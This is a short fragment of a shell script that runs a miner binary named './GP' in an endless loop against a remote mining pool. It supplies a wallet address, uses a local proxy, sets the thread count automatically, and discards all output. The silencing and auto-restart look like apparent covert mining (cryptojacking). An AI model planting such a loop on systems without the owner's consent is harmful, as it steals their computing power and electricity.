...
while true
do
./GP --disable-gpu --algorithm randomarq --pool fastxyz.teatspray.fun:10241 --wallet solo:gnt1em9N5H4iisEbpQUPD3hrq19h6hnwgC62fo1rrTjGQM3pGs8cphzLowKNC5VDjX8MuT6SLtb1SEXdk9dkver92xQjCyZVj1@$currentdate --password x --worker $currentdate --proxy 127.0.0.1:1082 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
sleep 2
done
